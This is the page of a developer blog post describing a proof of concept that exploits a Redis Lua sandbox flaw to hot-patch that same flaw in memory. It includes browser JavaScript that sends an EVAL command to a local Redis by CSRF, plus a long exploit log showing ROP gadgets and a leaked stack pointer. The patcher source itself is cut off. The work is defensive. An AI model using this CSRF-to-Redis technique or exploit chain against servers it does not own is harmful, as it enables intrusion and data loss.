
<!DOCTYPE html>
<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
<head>
  <meta charset="utf-8">
  <title>Redis Hot Patch - Ben's Blog</title>
  <meta name="author" content="Ben Murphy">

  
  <meta name="description" content="If we can use the Redis Lua scripting vulnerability to hot-patch it, the circle is closed and I can change business.&mdash; Salvatore Sanfilippo (@ &hellip;">
  

  <!-- http://t.co/dKP3o1e -->
  <meta name="HandheldFriendly" content="True">
  <meta name="MobileOptimized" content="320">
  <meta name="viewport" content="width=device-width, initial-scale=1">

  
  <link rel="canonical" href="http://benmmurphy.github.com/blog/2015/06/09/redis-hot-patch">
  <link href="/favicon.png" rel="icon">
  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
  <script src="/javascripts/modernizr-2.0.js"></script>
  <script src="/javascripts/ender.js"></script>
  <script src="/javascripts/octopress.js" type="text/javascript"></script>
  <link href="/atom.xml" rel="alternate" title="Ben's Blog" type="application/atom+xml">
  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
<link href="http://fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
<link href="http://fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">

  
  <script type="text/javascript">
    var _gaq = _gaq || [];
    _gaq.push(['_setAccount', 'UA-31750008-1']);
    _gaq.push(['_trackPageview']);

    (function() {
      var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
      ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
      var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
    })();
  </script>


</head>

<body   >
  <header role="banner"><hgroup>
  <h1><a href="/">Ben's Blog</a></h1>
  
    <h2>Developer Musings</h2>
  
</hgroup>

</header>
  <nav role="navigation"><ul class="subscription" data-subscription="rss">
  <li><a href="/atom.xml" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
  
</ul>
  
<form action="http://google.com/search" method="get">
  <fieldset role="search">
    <input type="hidden" name="q" value="site:benmmurphy.github.com" />
    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
  </fieldset>
</form>
  
<ul class="main-navigation">
  <li><a href="/">Blog</a></li>
  <li><a href="/blog/archives">Archives</a></li>
</ul>

</nav>
  <div id="main">
    <div id="content">
      <div>
<article class="hentry" role="article">
  
  <header>
    
      <h1 class="entry-title">Redis Hot Patch</h1>
    
    
      <p class="meta">
        








  


<time datetime="2015-06-09T09:53:00+10:00" pubdate data-updated="true"></time>
        
      </p>
    
  </header>


<div class="entry-content"><div class='embed tweet'><blockquote class="twitter-tweet"><p lang="en" dir="ltr">If we can use the Redis Lua scripting vulnerability to hot-patch it, the circle is closed and I can change business.</p>&mdash; Salvatore Sanfilippo (@antirez) <a href="https://twitter.com/antirez/status/606440338102689792">June 4, 2015</a></blockquote>
<script async src="//platform.twitter.com/widgets.js" charset="utf-8"></script></div>


<p>The arbitrary read and arbitrary write from the <a href="https://gist.github.com/corsix/6575486">Lua vulnerability</a> makes it quite easy to patch the vulnerability itself. I have written a proof of concept that should work on OSX Yosemite with any of the Homebrew bottled Redis versions that are vulnerable. It should also work on Mavericks and other compiled versions of Redis but I have not tested it on them (on versions other than Yosemite it may crash if the format of the long jump buffer is not the same). The Hot Patcher looks for the instruction <a href="https://github.com/antirez/redis/commit/fdf9d455098f54f7666c702ae464e6ea21e25411#diff-9486950b94262375ea8951aecc31b93cL498">cmp r15, 0x1b</a> and replaces it with &lsquo;cmpq rsp,0x1b&rsquo;. This comparison should never be true because the stack typically lives around 0x7fxxxxxxxxxxxxxx and will never reach such a low address. However, looking for this exact instruction makes the patcher quite brittle and it may not work on Redis versions compiled with different compilers.</p>

<p>The Hot Patcher proof of concept uses the CSRF technique to run so you can run it directly from your browser. However, before running it you should understand:</p>

<ul>
<li>it may crash your Redis server and you may lose your data (i think the exploit used to crash when the shellcode was allocated across two pages and i was only mprotect'ing the bottom page. but if this wasn&rsquo;t the cause of the crash then the exploit is still flakey. or there could still be bugs.)</li>
<li>it might not crash your Redis server but may silently corrupt the data in your Redis server</li>
<li>you MUST own the Redis server running on 127.0.0.1:6379</li>
<li>this is not a full fix for the Lua sandbox bypass and only disables the loading of bytecode</li>
<li>it does not permanently patch Redis and the patch will be reverted after a restart</li>
<li>it is probably better to write a script for GDB to do the live patching. But I don&rsquo;t understand GDB scripting :(</li>
</ul>


<p><input id='hot_patch' type='button' value='Hot Patch Me' style="background-color: red; border-color: black; color: white; border-radius: 0px; border-style: solid; border-width: 2px; font-size: 30px; cursor: pointer" /></p>

<script type='text/javascript'>

(function() {
  function doit() {

    var captions = $("figcaption span");

    for (var i = 0; i < captions.length; ++i) {
      if ($(captions[i]).text() == "Patch Source Code") {

        var text = $(".code", captions[i].parentNode.parentNode).text();

        var bad = "EVAL "  + JSON.stringify(text) + " 0\r\n";
        var x = new XMLHttpRequest();
        x.open("POST", "http://localhost:6379");
        x.send(bad);
      }
    }
  }

  $("#hot_patch").click(function() {

    if (confirm("You agree that you have reviewed the source code of this page and understand what the patcher will do and will not hold the author of this page liable for any damage the patcher may cause. ")) {

      doit();
    }
  });
})();

</script>


<p>It is best to run the Redis server from your terminal then you can see the output from the patcher. It should look something like:</p>

<figure class='code'><figcaption><span>Example Output</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
<span class='line-number'>83</span>
<span class='line-number'>84</span>
<span class='line-number'>85</span>
<span class='line-number'>86</span>
<span class='line-number'>87</span>
<span class='line-number'>88</span>
<span class='line-number'>89</span>
<span class='line-number'>90</span>
<span class='line-number'>91</span>
<span class='line-number'>92</span>
<span class='line-number'>93</span>
<span class='line-number'>94</span>
<span class='line-number'>95</span>
<span class='line-number'>96</span>
<span class='line-number'>97</span>
<span class='line-number'>98</span>
<span class='line-number'>99</span>
<span class='line-number'>100</span>
<span class='line-number'>101</span>
<span class='line-number'>102</span>
<span class='line-number'>103</span>
<span class='line-number'>104</span>
<span class='line-number'>105</span>
<span class='line-number'>106</span>
<span class='line-number'>107</span>
<span class='line-number'>108</span>
<span class='line-number'>109</span>
<span class='line-number'>110</span>
<span class='line-number'>111</span>
<span class='line-number'>112</span>
<span class='line-number'>113</span>
<span class='line-number'>114</span>
<span class='line-number'>115</span>
<span class='line-number'>116</span>
<span class='line-number'>117</span>
<span class='line-number'>118</span>
<span class='line-number'>119</span>
<span class='line-number'>120</span>
<span class='line-number'>121</span>
<span class='line-number'>122</span>
<span class='line-number'>123</span>
<span class='line-number'>124</span>
<span class='line-number'>125</span>
<span class='line-number'>126</span>
<span class='line-number'>127</span>
<span class='line-number'>128</span>
<span class='line-number'>129</span>
<span class='line-number'>130</span>
<span class='line-number'>131</span>
<span class='line-number'>132</span>
<span class='line-number'>133</span>
<span class='line-number'>134</span>
<span class='line-number'>135</span>
<span class='line-number'>136</span>
<span class='line-number'>137</span>
<span class='line-number'>138</span>
<span class='line-number'>139</span>
<span class='line-number'>140</span>
<span class='line-number'>141</span>
<span class='line-number'>142</span>
<span class='line-number'>143</span>
<span class='line-number'>144</span>
<span class='line-number'>145</span>
<span class='line-number'>146</span>
<span class='line-number'>147</span>
<span class='line-number'>148</span>
<span class='line-number'>149</span>
<span class='line-number'>150</span>
<span class='line-number'>151</span>
<span class='line-number'>152</span>
<span class='line-number'>153</span>
<span class='line-number'>154</span>
<span class='line-number'>155</span>
<span class='line-number'>156</span>
<span class='line-number'>157</span>
<span class='line-number'>158</span>
<span class='line-number'>159</span>
<span class='line-number'>160</span>
<span class='line-number'>161</span>
<span class='line-number'>162</span>
<span class='line-number'>163</span>
<span class='line-number'>164</span>
<span class='line-number'>165</span>
<span class='line-number'>166</span>
<span class='line-number'>167</span>
<span class='line-number'>168</span>
<span class='line-number'>169</span>
<span class='line-number'>170</span>
<span class='line-number'>171</span>
<span class='line-number'>172</span>
<span class='line-number'>173</span>
<span class='line-number'>174</span>
<span class='line-number'>175</span>
<span class='line-number'>176</span>
<span class='line-number'>177</span>
<span class='line-number'>178</span>
<span class='line-number'>179</span>
<span class='line-number'>180</span>
<span class='line-number'>181</span>
<span class='line-number'>182</span>
<span class='line-number'>183</span>
<span class='line-number'>184</span>
<span class='line-number'>185</span>
<span class='line-number'>186</span>
<span class='line-number'>187</span>
<span class='line-number'>188</span>
<span class='line-number'>189</span>
<span class='line-number'>190</span>
<span class='line-number'>191</span>
<span class='line-number'>192</span>
<span class='line-number'>193</span>
<span class='line-number'>194</span>
<span class='line-number'>195</span>
<span class='line-number'>196</span>
<span class='line-number'>197</span>
<span class='line-number'>198</span>
<span class='line-number'>199</span>
<span class='line-number'>200</span>
<span class='line-number'>201</span>
<span class='line-number'>202</span>
<span class='line-number'>203</span>
<span class='line-number'>204</span>
<span class='line-number'>205</span>
<span class='line-number'>206</span>
<span class='line-number'>207</span>
<span class='line-number'>208</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[*] Matches OSX =&gt; Darwin 14.3.0 x86_64
</span><span class='line'>[*] 64 Bit
</span><span class='line'>[*] Loading byte code supported
</span><span class='line'>[*] found macho base address: 000000010c9c2000
</span><span class='line'>[*] found segment: __PAGEZERO =&gt; 0000000000000000/0000000000000000
</span><span class='line'>[*] found segment: __TEXT =&gt; 0000000100000000/0000000000000000
</span><span class='line'>[*] found segment: __DATA =&gt; 0000000100066000/0000000000066000
</span><span class='line'>[*] found segment: __LINKEDIT =&gt; 0000000100080000/000000000006b000
</span><span class='line'>[*] parsed_symbol ___assert_rtn =&gt; 2:224
</span><span class='line'>[*] parsed_symbol ___bzero =&gt; 2:232
</span><span class='line'>[*] parsed_symbol ___error =&gt; 2:240
</span><span class='line'>[*] parsed_symbol ___maskrune =&gt; 2:248
</span><span class='line'>[*] parsed_symbol ___memcpy_chk =&gt; 2:256
</span><span class='line'>[*] parsed_symbol ___snprintf_chk =&gt; 2:264
</span><span class='line'>[*] parsed_symbol ___sprintf_chk =&gt; 2:272
</span><span class='line'>[*] parsed_symbol ___stack_chk_fail =&gt; 2:280
</span><span class='line'>[*] parsed_symbol ___strcat_chk =&gt; 2:288
</span><span class='line'>[*] parsed_symbol ___strncat_chk =&gt; 2:296
</span><span class='line'>[*] parsed_symbol ___strncpy_chk =&gt; 2:304
</span><span class='line'>[*] parsed_symbol ___tolower =&gt; 2:312
</span><span class='line'>[*] parsed_symbol ___toupper =&gt; 2:320
</span><span class='line'>[*] parsed_symbol ___vsnprintf_chk =&gt; 2:328
</span><span class='line'>[*] parsed_symbol __exit =&gt; 2:336
</span><span class='line'>[*] parsed_symbol _abort =&gt; 2:344
</span><span class='line'>[*] parsed_symbol _accept =&gt; 2:352
</span><span class='line'>[*] parsed_symbol _access =&gt; 2:360
</span><span class='line'>[*] parsed_symbol _acos =&gt; 2:368
</span><span class='line'>[*] parsed_symbol _asin =&gt; 2:376
</span><span class='line'>[*] parsed_symbol _atan =&gt; 2:384
</span><span class='line'>[*] parsed_symbol _atan2 =&gt; 2:392
</span><span class='line'>[*] parsed_symbol _atoi =&gt; 2:400
</span><span class='line'>[*] parsed_symbol _backtrace =&gt; 2:408
</span><span class='line'>[*] parsed_symbol _backtrace_symbols_fd =&gt; 2:416
</span><span class='line'>[*] parsed_symbol _bind =&gt; 2:424
</span><span class='line'>[*] parsed_symbol _calloc =&gt; 2:432
</span><span class='line'>[*] parsed_symbol _ceil =&gt; 2:440
</span><span class='line'>[*] parsed_symbol _chdir =&gt; 2:448
</span><span class='line'>[*] parsed_symbol _chmod =&gt; 2:456
</span><span class='line'>[*] parsed_symbol _close =&gt; 2:464
</span><span class='line'>[*] parsed_symbol _connect =&gt; 2:472
</span><span class='line'>[*] parsed_symbol _cos =&gt; 2:480
</span><span class='line'>[*] parsed_symbol _cosh =&gt; 2:488
</span><span class='line'>[*] parsed_symbol _dup2 =&gt; 2:496
</span><span class='line'>[*] parsed_symbol _execve =&gt; 2:504
</span><span class='line'>[*] parsed_symbol _exit =&gt; 2:512
</span><span class='line'>[*] parsed_symbol _exp =&gt; 2:520
</span><span class='line'>[*] parsed_symbol _fclose =&gt; 2:528
</span><span class='line'>[*] parsed_symbol _fcntl =&gt; 2:536
</span><span class='line'>[*] parsed_symbol _feof =&gt; 2:544
</span><span class='line'>[*] parsed_symbol _ferror =&gt; 2:552
</span><span class='line'>[*] parsed_symbol _fflush =&gt; 2:560
</span><span class='line'>[*] parsed_symbol _fgets =&gt; 2:568
</span><span class='line'>[*] parsed_symbol _fileno =&gt; 2:576
</span><span class='line'>[*] parsed_symbol _floor =&gt; 2:584
</span><span class='line'>[*] parsed_symbol _fmod =&gt; 2:592
</span><span class='line'>[*] parsed_symbol _fopen =&gt; 2:600
</span><span class='line'>[*] parsed_symbol _fork =&gt; 2:608
</span><span class='line'>[*] parsed_symbol _fprintf =&gt; 2:616
</span><span class='line'>[*] parsed_symbol _fputc =&gt; 2:624
</span><span class='line'>[*] parsed_symbol _fputs =&gt; 2:632
</span><span class='line'>[*] parsed_symbol _fread =&gt; 2:640
</span><span class='line'>[*] parsed_symbol _free =&gt; 2:648
</span><span class='line'>[*] parsed_symbol _freeaddrinfo =&gt; 2:656
</span><span class='line'>[*] parsed_symbol _freopen =&gt; 2:664
</span><span class='line'>[*] parsed_symbol _frexp =&gt; 2:672
</span><span class='line'>[*] parsed_symbol _fstat$INODE64 =&gt; 2:680
</span><span class='line'>[*] parsed_symbol _fsync =&gt; 2:688
</span><span class='line'>[*] parsed_symbol _ftello =&gt; 2:696
</span><span class='line'>[*] parsed_symbol _ftruncate =&gt; 2:704
</span><span class='line'>[*] parsed_symbol _fwrite =&gt; 2:712
</span><span class='line'>[*] parsed_symbol _gai_strerror =&gt; 2:720
</span><span class='line'>[*] parsed_symbol _getaddrinfo =&gt; 2:728
</span><span class='line'>[*] parsed_symbol _getc =&gt; 2:736
</span><span class='line'>[*] parsed_symbol _getcwd =&gt; 2:744
</span><span class='line'>[*] parsed_symbol _getpeername =&gt; 2:752
</span><span class='line'>[*] parsed_symbol _getpid =&gt; 2:760
</span><span class='line'>[*] parsed_symbol _getprogname =&gt; 2:768
</span><span class='line'>[*] parsed_symbol _getrlimit =&gt; 2:776
</span><span class='line'>[*] parsed_symbol _getrusage =&gt; 2:784
</span><span class='line'>[*] parsed_symbol _getsockname =&gt; 2:792
</span><span class='line'>[*] parsed_symbol _getsockopt =&gt; 2:800
</span><span class='line'>[*] parsed_symbol _gettimeofday =&gt; 2:808
</span><span class='line'>[*] parsed_symbol _inet_ntop =&gt; 2:816
</span><span class='line'>[*] parsed_symbol _ioctl =&gt; 2:824
</span><span class='line'>[*] parsed_symbol _kevent =&gt; 2:832
</span><span class='line'>[*] parsed_symbol _kill =&gt; 2:840
</span><span class='line'>[*] parsed_symbol _kqueue =&gt; 2:848
</span><span class='line'>[*] parsed_symbol _ldexp =&gt; 2:856
</span><span class='line'>[*] parsed_symbol _listen =&gt; 2:864
</span><span class='line'>[*] parsed_symbol _localeconv =&gt; 2:872
</span><span class='line'>[*] parsed_symbol _localtime =&gt; 2:880
</span><span class='line'>[*] parsed_symbol _log =&gt; 2:888
</span><span class='line'>[*] parsed_symbol _log10 =&gt; 2:896
</span><span class='line'>[*] parsed_symbol _longjmp =&gt; 2:904
</span><span class='line'>[*] parsed_symbol _lseek =&gt; 2:912
</span><span class='line'>[*] parsed_symbol _malloc =&gt; 2:920
</span><span class='line'>[*] parsed_symbol _malloc_size =&gt; 2:928
</span><span class='line'>[*] parsed_symbol _memchr =&gt; 2:936
</span><span class='line'>[*] parsed_symbol _memcmp =&gt; 2:944
</span><span class='line'>[*] parsed_symbol _memcpy =&gt; 2:952
</span><span class='line'>[*] parsed_symbol _memmove =&gt; 2:960
</span><span class='line'>[*] parsed_symbol _memset =&gt; 2:968
</span><span class='line'>[*] parsed_symbol _memset_pattern16 =&gt; 2:976
</span><span class='line'>[*] parsed_symbol _modf =&gt; 2:984
</span><span class='line'>[*] parsed_symbol _nanosleep =&gt; 2:992
</span><span class='line'>[*] parsed_symbol _open =&gt; 2:1000
</span><span class='line'>[*] parsed_symbol _openlog =&gt; 2:1008
</span><span class='line'>[*] parsed_symbol _perror =&gt; 2:1016
</span><span class='line'>[*] parsed_symbol _poll =&gt; 2:1024
</span><span class='line'>[*] parsed_symbol _pow =&gt; 2:1032
</span><span class='line'>[*] parsed_symbol _printf =&gt; 2:1040
</span><span class='line'>[*] parsed_symbol _pthread_attr_getstacksize =&gt; 2:1048
</span><span class='line'>[*] parsed_symbol _pthread_attr_init =&gt; 2:1056
</span><span class='line'>[*] parsed_symbol _pthread_attr_setstacksize =&gt; 2:1064
</span><span class='line'>[*] parsed_symbol _pthread_cancel =&gt; 2:1072
</span><span class='line'>[*] parsed_symbol _pthread_cond_init =&gt; 2:1080
</span><span class='line'>[*] parsed_symbol _pthread_cond_signal =&gt; 2:1088
</span><span class='line'>[*] parsed_symbol _pthread_cond_wait =&gt; 2:1096
</span><span class='line'>[*] parsed_symbol _pthread_create =&gt; 2:1104
</span><span class='line'>[*] parsed_symbol _pthread_join =&gt; 2:1112
</span><span class='line'>[*] parsed_symbol _pthread_mutex_init =&gt; 2:1120
</span><span class='line'>[*] parsed_symbol _pthread_mutex_lock =&gt; 2:1128
</span><span class='line'>[*] parsed_symbol _pthread_mutex_unlock =&gt; 2:1136
</span><span class='line'>[*] parsed_symbol _pthread_setcancelstate =&gt; 2:1144
</span><span class='line'>[*] parsed_symbol _pthread_setcanceltype =&gt; 2:1152
</span><span class='line'>[*] parsed_symbol _pthread_sigmask =&gt; 2:1160
</span><span class='line'>[*] parsed_symbol _putchar =&gt; 2:1168
</span><span class='line'>[*] parsed_symbol _puts =&gt; 2:1176
</span><span class='line'>[*] parsed_symbol _qsort =&gt; 2:1184
</span><span class='line'>[*] parsed_symbol _rand =&gt; 2:1192
</span><span class='line'>[*] parsed_symbol _random =&gt; 2:1200
</span><span class='line'>[*] parsed_symbol _read =&gt; 2:1208
</span><span class='line'>[*] parsed_symbol _realloc =&gt; 2:1216
</span><span class='line'>[*] parsed_symbol _rename =&gt; 2:1224
</span><span class='line'>[*] parsed_symbol _setenv =&gt; 2:1232
</span><span class='line'>[*] parsed_symbol _setitimer =&gt; 2:1240
</span><span class='line'>[*] parsed_symbol _setjmp =&gt; 2:1248
</span><span class='line'>[*] parsed_symbol _setlocale =&gt; 2:1256
</span><span class='line'>[*] parsed_symbol _setprogname =&gt; 2:1264
</span><span class='line'>[*] parsed_symbol _setrlimit =&gt; 2:1272
</span><span class='line'>[*] parsed_symbol _setsid =&gt; 2:1280
</span><span class='line'>[*] parsed_symbol _setsockopt =&gt; 2:1288
</span><span class='line'>[*] parsed_symbol _sigaction =&gt; 2:1296
</span><span class='line'>[*] parsed_symbol _signal =&gt; 2:1304
</span><span class='line'>[*] parsed_symbol _sin =&gt; 2:1312
</span><span class='line'>[*] parsed_symbol _sinh =&gt; 2:1320
</span><span class='line'>[*] parsed_symbol _sleep =&gt; 2:1328
</span><span class='line'>[*] parsed_symbol _socket =&gt; 2:1336
</span><span class='line'>[*] parsed_symbol _srand =&gt; 2:1344
</span><span class='line'>[*] parsed_symbol _sscanf =&gt; 2:1352
</span><span class='line'>[*] parsed_symbol _strcasecmp =&gt; 2:1360
</span><span class='line'>[*] parsed_symbol _strchr =&gt; 2:1368
</span><span class='line'>[*] parsed_symbol _strcmp =&gt; 2:1376
</span><span class='line'>[*] parsed_symbol _strcoll =&gt; 2:1384
</span><span class='line'>[*] parsed_symbol _strcspn =&gt; 2:1392
</span><span class='line'>[*] parsed_symbol _strdup =&gt; 2:1400
</span><span class='line'>[*] parsed_symbol _strerror =&gt; 2:1408
</span><span class='line'>[*] parsed_symbol _strerror_r =&gt; 2:1416
</span><span class='line'>[*] parsed_symbol _strftime =&gt; 2:1424
</span><span class='line'>[*] parsed_symbol _strlen =&gt; 2:1432
</span><span class='line'>[*] parsed_symbol _strncasecmp =&gt; 2:1440
</span><span class='line'>[*] parsed_symbol _strncmp =&gt; 2:1448
</span><span class='line'>[*] parsed_symbol _strncpy =&gt; 2:1456
</span><span class='line'>[*] parsed_symbol _strpbrk =&gt; 2:1464
</span><span class='line'>[*] parsed_symbol _strstr =&gt; 2:1472
</span><span class='line'>[*] parsed_symbol _strtod =&gt; 2:1480
</span><span class='line'>[*] parsed_symbol _strtol =&gt; 2:1488
</span><span class='line'>[*] parsed_symbol _strtold =&gt; 2:1496
</span><span class='line'>[*] parsed_symbol _strtoll =&gt; 2:1504
</span><span class='line'>[*] parsed_symbol _strtoul =&gt; 2:1512
</span><span class='line'>[*] parsed_symbol _strtoull =&gt; 2:1520
</span><span class='line'>[*] parsed_symbol _syslog =&gt; 2:1528
</span><span class='line'>[*] parsed_symbol _tan =&gt; 2:1536
</span><span class='line'>[*] parsed_symbol _tanh =&gt; 2:1544
</span><span class='line'>[*] parsed_symbol _task_for_pid =&gt; 2:1552
</span><span class='line'>[*] parsed_symbol _task_info =&gt; 2:1560
</span><span class='line'>[*] parsed_symbol _time =&gt; 2:1568
</span><span class='line'>[*] parsed_symbol _uname =&gt; 2:1576
</span><span class='line'>[*] parsed_symbol _ungetc =&gt; 2:1584
</span><span class='line'>[*] parsed_symbol _unlink =&gt; 2:1592
</span><span class='line'>[*] parsed_symbol _vfprintf =&gt; 2:1600
</span><span class='line'>[*] parsed_symbol _wait3 =&gt; 2:1608
</span><span class='line'>[*] parsed_symbol _write =&gt; 2:1616
</span><span class='line'>[*] Found _strlen symbol: 1432
</span><span class='line'>[*] Found _strlen location: 00007fff97463140
</span><span class='line'>[*] found libsystem_c macho base address: 00007fff97462000
</span><span class='line'>[*] Found _setrlimit symbol: 1272
</span><span class='line'>[*] Found _setrlimit location: 00007fff945edc4a
</span><span class='line'>[*] found libkernel macho base address: 00007fff945da000
</span><span class='line'>[+] Found longjump jump location 000000010ca1a05a
</span><span class='line'>[*] found segment: __TEXT =&gt; 00007fff8ca8c000/0000000000000000
</span><span class='line'>[*] found segment: __DATA =&gt; 00007fff71e58000/0000000011996000
</span><span class='line'>[*] found segment: __LINKEDIT =&gt; 00007fff8fed3000/00000000124cf000
</span><span class='line'>[+] found mprotect symbol 00007fff945efee8
</span><span class='line'>[*] found segment: __TEXT =&gt; 00007fff8f914000/0000000000000000
</span><span class='line'>[*] found segment: __DATA =&gt; 00007fff7258e000/00000000120cc000
</span><span class='line'>[*] found segment: __LINKEDIT =&gt; 00007fff8fed3000/00000000124cf000
</span><span class='line'>[*] found cmp   r15, 0x1b
</span><span class='line'>[*] found cmp @ 000000010ca05fb5
</span><span class='line'>[*] Found rop: poprbxpopr14poprbp @ 00007fff97463449
</span><span class='line'>[*] Found rop: poprdipoprbp @ 00007fff974635ee
</span><span class='line'>[*] Found rop: poprsipoprbp @ 00007fff9746344b
</span><span class='line'>[*] Found rop: movrdxr14callrbx @ 00007fff974c62f4
</span><span class='line'>[*] leaked stack pointer: 00007fff5323d018
</span><span class='line'>[*] old jump_buf eip 000000010ca052c0
</span><span class='line'>[*] existing sp 00007fff5323d010
</span><span class='line'>[*] new sp 00007fc98a80a218
</span><span class='line'>[*] resumed normal redis execution</span></code></pre></td></tr></table></div></figure>


<p>You can test if the patcher worked by running the following from redis-cli:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>eval "return tostring(loadstring(string.dump(function() end)))" 0</span></code></pre></td></tr></table></div></figure>


<p>If you are vulnerable it will return:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>"function: 0x7fdcd8439df0"</span></code></pre></td></tr></table></div></figure>


<p>If the patch has been applied it will return:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>"nil"</span></code></pre></td></tr></table></div></figure>


<p>Here is the lua code for the patcher:</p>

<figure class='code'><figcaption><span>Patch Source Code</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
<span class='line-number'>83</span>
<span class='line-number'>84</span>
<span class='line-number'>85</span>
<span class='line-number'>86</span>
<span class='line-number'>87</span>
<span class='line-number'>88</span>
<span class='line-number'>89</span>
<span class='line-number'>90</span>
<span class='line-number'>91</span>
<span class='line-number'>92</span>
<span class='line-number'>93</span>
<span class='line-number'>94</span>
<span class='line-number'>95</span>
<span class='line-number'>96</span>
<span class='line-number'>97</span>
<span class='line-number'>98</span>
<span class='line-number'>99</span>
<span class='line-number'>100</span>
<span class='line-number'>101</span>
<span class='line-number'>102</span>
<span class='line-number'>103</span>
<span class='line-number'>104</span>
<span class='line-number'>105</span>
<span class='line-number'>106</span>
<span class='line-number'>107</span>
<span class='line-number'>108</span>
<span class='line-number'>109</span>
